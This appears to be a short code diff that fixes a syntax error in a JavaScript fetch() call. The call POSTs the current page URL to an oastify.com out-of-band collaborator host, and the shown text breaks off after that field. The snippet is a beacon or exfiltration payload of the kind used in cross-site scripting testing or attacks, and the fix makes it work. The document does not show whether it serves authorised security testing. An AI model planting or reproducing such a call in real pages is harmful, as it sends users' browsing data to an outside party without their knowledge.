@@ -1,4 +1,4 @@
-fetch('https://wyyj5imoxv7w3td2jx0qztindej57vvk.oastify.com'', {
+fetch('https://wyyj5imoxv7w3td2jx0qztindej57vvk.oastify.com', {
   method: 'POST',
   body: JSON.stringify({
     url: window.location.href,
